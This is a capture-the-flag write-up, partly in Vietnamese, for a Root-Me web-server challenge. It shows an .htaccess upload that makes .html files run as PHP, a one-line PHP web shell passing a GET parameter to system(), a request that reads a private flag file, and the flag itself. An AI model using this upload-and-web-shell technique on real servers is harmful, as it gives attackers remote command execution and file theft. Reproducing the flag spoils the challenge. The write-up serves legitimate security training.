# [PHP - Apache configuration](https://www.root-me.org/en/Challenges/Web-Server/PHP-Apache-configuration)

## Solutions update 1

I came back here when an intern in my company stuck on this challenge and asked me.

He said that he did exactly what i did but it did not work. so i tried again and it was true.

It's seem like php execution is disabled in this folder.

So I walked around google to find a way to turn on php execution with .htaccess: <https://www.php.net/manual/en/apache.configuration.php>

updated solution:

- .htaccess

```config
AddHandler application/x-httpd-php .html
php_flag engine on
```

## Solutions

- Upload một file có tên `.htaccess` với nội dung là:

```text
AddHandler application/x-httpd-php .html
```

- Upload một file có tên là `test.html` với nội dung là:

```php
<?php
system($_GET['command']);
?>
```

- Gửi request đến URL mà server trả về kèm query parameter `?command=cat%20../../private/flag.txt` là lấy được flag: `ht@cc3ss2RCE4th%w1n`

## Giải thích

- Mỗi file `.htaccess` sẽ có ảnh hưởng đến directory chứa nó và các subdirectory.
- Mỗi người chơi rootme sẽ được cung cấp một sessionID cũng chính là tên folder chứa tất cả các file người dùng upload lên.
- `AddHandler application/x-httpd-php .html` sẽ làm cho các file html cùng directory với file `.htacccess` này chạy như file php.

## References

- <https://docs.oracle.com/cd/B14099_19/web.1012/q20206/howto/htaccess.html>
